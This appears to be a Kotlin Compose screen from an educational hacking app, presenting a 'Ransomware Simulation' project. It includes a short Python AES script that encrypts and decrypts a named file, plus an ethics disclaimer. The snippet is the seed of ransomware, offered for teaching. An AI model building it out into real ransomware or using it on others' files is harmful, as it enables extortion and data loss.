package com.example.hackwithpython.projects

import androidx.compose.foundation.horizontalScroll
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.Text
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.text.BasicText
import androidx.compose.foundation.text.selection.SelectionContainer
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.Button
import androidx.compose.runtime.Composable
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.material3.MaterialTheme
import androidx.compose.ui.Alignment
import androidx.compose.ui.text.TextStyle
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.unit.sp
import androidx.navigation.NavController
import com.example.hackwithpython.HackerWhite


@Composable
fun Project13Screen(navController: NavController) {
    Column(modifier = Modifier
        .padding(16.dp)
        .verticalScroll(rememberScrollState()),
        verticalArrangement = Arrangement.Top,
        horizontalAlignment = Alignment.Start) {
        Text(
            text = "Project 13: Ransomware Simulation",
            fontWeight = FontWeight.Bold,
            style = MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Introduction Section
        Text(
            text = """
                In this project, you will simulate basic ransomware attacks using Python. 
                The simulation will demonstrate how ransomware can encrypt files and prompt users for a ransom. 
                You will also implement a decryption mechanism to restore the files.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Prerequisites
        Text(
            text = "Prerequisites",
            fontWeight = FontWeight.Bold,
            style = MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                Before starting this project, ensure you have:
                - Basic understanding of file handling in Python.
                - Familiarity with encryption techniques (e.g., AES).
                - An ethical mindset and awareness of legal implications.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Project Description
        Text(
            text = "Project Description",
            fontWeight = FontWeight.Bold,
            style = MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                In this project, you will:
                - Create a script that encrypts specified files on the system.
                - Simulate a ransom message that instructs the user to pay to decrypt the files.
                - Implement a decryption method to restore the encrypted files.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Python Example Code
        Text(
            text = "Python Code Example: Basic Ransomware Simulation",
            fontWeight = FontWeight.Bold,
            style = MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                Below is an example of how to create a basic ransomware simulation using Python:
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )
        SelectionContainer {
        BasicText(
            text = """
                from Crypto.Cipher import AES
                import os
                import base64

                def encrypt_file(file_name, key):
                    cipher = AES.new(key, AES.MODE_EAX)
                    with open(file_name, 'rb') as f:
                        plaintext = f.read()
                    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
                    with open(file_name + '.encrypted', 'wb') as f:
                        f.write(cipher.nonce + tag + ciphertext)

                def decrypt_file(file_name, key):
                    with open(file_name, 'rb') as f:
                        nonce, tag, ciphertext = f.read(16), f.read(16), f.read()
                    cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
                    plaintext = cipher.decrypt_and_verify(ciphertext, tag)
                    with open(file_name[:-10], 'wb') as f:
                        f.write(plaintext)

                # Example usage
                key = b'Sixteen byte key'  # Replace with a secure key
                encrypt_file('file_to_encrypt.txt', key)
                # To decrypt, call decrypt_file('file_to_encrypt.txt.encrypted', key)
            """.trimIndent(),
                style = TextStyle(
                    fontFamily = FontFamily.Monospace,
                    fontSize = 14.sp,
                    color = HackerWhite
                ),
                modifier =Modifier.padding(12.dp)
                    .horizontalScroll(rememberScrollState())
        )
            }

        // Ethical Use Disclaimer
        Text(
            text = "Ethical Use Disclaimer",
            fontWeight = FontWeight.Bold,
            style = MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                This project is intended for educational purposes only. 
                Creating actual ransomware or using these techniques against others without consent is illegal and unethical. 
                Always seek permission and ensure you are in compliance with local laws before testing or demonstrating this type of project.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        Spacer(modifier = Modifier.height(32.dp))

        // Button to navigate to the home screen or previous project
        Button(onClick = { navController.navigate("project14") }) {
            Text(text = "Next Project")
        }
    }
}
